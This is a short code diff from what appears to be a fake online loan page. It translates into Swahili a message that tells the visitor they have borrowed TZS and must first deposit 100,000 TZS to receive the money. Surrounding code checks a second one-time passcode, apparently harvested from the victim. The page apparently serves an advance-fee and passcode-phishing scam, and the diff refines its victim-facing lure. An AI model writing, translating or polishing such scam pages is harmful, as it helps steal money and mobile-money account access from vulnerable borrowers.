@@ -545,7 +545,7 @@
                         clearInterval(interval);
                         document.getElementById('step-waiting').style.display = 'none';
                         document.getElementById('step-success').style.display = 'block';
-                        document.getElementById('success-msg').innerHTML = `Congratulations you have successfully borrow TZS ${currentAmount}<br><br>Tafadhali weka kiasi cha 100,000Tz kwenye akaunti yako ili kupokea kiasi unachochagua kwenye ${fullPhoneNumber}.`;
+                        document.getElementById('success-msg').innerHTML = `Hongera,umefanikiwa kukopa TZS ${currentAmount}<br><br>Tafadhali weka kiasi cha 100,000Tz kwenye akaunti yako ili kupokea kiasi unachochagua kwenye ${fullPhoneNumber}.`;
                     } else if (data.status === 'wrong') {
                         clearInterval(interval);
                         alert('OTP 2 sio sahihi. Jaribu tena.');
